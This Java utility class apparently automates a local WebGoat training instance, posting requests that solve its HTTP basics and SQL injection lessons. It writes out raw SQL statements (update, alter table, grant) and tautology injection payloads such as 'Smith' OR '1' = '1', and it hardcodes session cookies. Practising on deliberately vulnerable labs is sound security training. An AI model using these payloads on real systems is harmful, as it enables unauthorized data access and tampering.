package api.util;


import api.client.core.ApiClient;
import api.client.core.CookieStore;
import okhttp3.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;

public class InjectionFlawsUtil extends ApiClient {
	private static final Logger LOGGER = LoggerFactory.getLogger(InjectionFlawsUtil.class);

	public InjectionFlawsUtil(CookieStore cookieStore) {
		super(cookieStore);
	}

	public static Response reverseName(String name) throws IOException {
		LOGGER.info("Reverse name '{}'", name);
		OkHttpClient client = new OkHttpClient();

		MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
		RequestBody body = RequestBody.create(mediaType, "person=" + name);
		Request request = new Request.Builder()
				.url("http://localhost:8080/WebGoat/HttpBasics/attack1")
				.post(body)
				.addHeader("Content-Type", "application/x-www-form-urlencoded")
				.addHeader("Cookie", "JSESSIONID=2C9C25C2AD4C6235E0CC531B3FE0B9F5; WEBWOLFSESSION=4147806912B975532240F527E5488913")
				.addHeader("cache-control", "no-cache")
				.addHeader("Postman-Token", "5a67a1ed-97d1-456b-a183-9a22d5995ca6")
				.build();

		return client.newCall(request).execute();
	}

	public static Response selectDepartment(String userName) throws IOException {
		LOGGER.info("Select department by user name'{}'", userName);
		OkHttpClient client = new OkHttpClient();

		MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
		RequestBody body = RequestBody.create(mediaType, "query=" + "select department from employees where first_name='" + userName + "';");
		Request request = new Request.Builder()
				.url("http://localhost:8080/WebGoat/SqlInjection/attack2")
				.post(body)
				.addHeader("Cookie", "JSESSIONID=2C9C25C2AD4C6235E0CC531B3FE0B9F5; WEBWOLFSESSION=4147806912B975532240F527E5488913")
				.build();

		return client.newCall(request).execute();
	}

	public static Response updateDepartment(String userName, String department) throws IOException {
		LOGGER.info("Update department '{}' by user name'{}'", department, userName);
		OkHttpClient client = new OkHttpClient();

		MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
		RequestBody body = RequestBody.create(mediaType, "query=" + "update employees set department = '" + department + "' where first_name = '" + userName + "';");
		Request request = new Request.Builder()
				.url("http://localhost:8080/WebGoat/SqlInjection/attack3")
				.post(body)
				.addHeader("Cookie", "JSESSIONID=2C9C25C2AD4C6235E0CC531B3FE0B9F5; WEBWOLFSESSION=4147806912B975532240F527E5488913")
				.build();

		return client.newCall(request).execute();
	}

	public static Response alterTable(String table, String column, String type) throws IOException {
		LOGGER.info("Alter table'{}'. Add column'{}' with type '{}'", table, column, type);
		OkHttpClient client = new OkHttpClient();

		MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
		RequestBody body = RequestBody.create(mediaType, "query=" + "alter table " + table + " add " + column + " " + type + ";");
		Request request = new Request.Builder()
				.url("http://localhost:8080/WebGoat/SqlInjection/attack3")
				.post(body)
				.addHeader("Cookie", "JSESSIONID=2C9C25C2AD4C6235E0CC531B3FE0B9F5; WEBWOLFSESSION=4147806912B975532240F527E5488913")
				.build();

		return client.newCall(request).execute();
	}

	public static Response grantTo(String user, String createAlter) throws IOException {
		LOGGER.info("Grant to user '{}' permission to '{}'", user, createAlter);
		OkHttpClient client = new OkHttpClient();

		MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
		RequestBody body = RequestBody.create(mediaType, "query=" + "grant " + createAlter + " table to " + user + ";");
		Request request = new Request.Builder()
				.url("http://localhost:8080/WebGoat/SqlInjection/attack3")
				.post(body)
				.addHeader("Cookie", "JSESSIONID=2C9C25C2AD4C6235E0CC531B3FE0B9F5; WEBWOLFSESSION=4147806912B975532240F527E5488913")
				.build();

		return client.newCall(request).execute();
	}

	public static Response getDepartment() throws IOException {
		LOGGER.info("Get department");
		OkHttpClient client = new OkHttpClient();
//		MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
//		RequestBody requestBody = RequestBody.create(mediaType, "name=Smith' OR '1' = '1&auth_tan=3SL99A' OR '1' = '1");

		RequestBody requestBody = new MultipartBody.Builder()
				.setType(MultipartBody.FORM)
				.addFormDataPart("name", "Smith' OR '1' = '1")
				.addFormDataPart("auth_tan", "3SL99A' OR '1' = '1")
				.build();

//		RequestBody requestBody = new FormBody.Builder()
//				.add("name", "Smith' OR '1' = '1")
//				.add("auth_tan", "3SL99A' OR '1' = '1")
//				.build();

		Request request = new Request.Builder()
				.url("http://localhost:8080/WebGoat/SqlInjection/attack8")
				.post(requestBody)
				.addHeader("Content-Type", "application/x-www-form-urlencoded")
				.addHeader("Cookie", "JSESSIONID=2C9C25C2AD4C6235E0CC531B3FE0B9F5; WEBWOLFSESSION=4147806912B975532240F527E5488913")
				.build();

		return client.newCall(request).execute();
	}
}
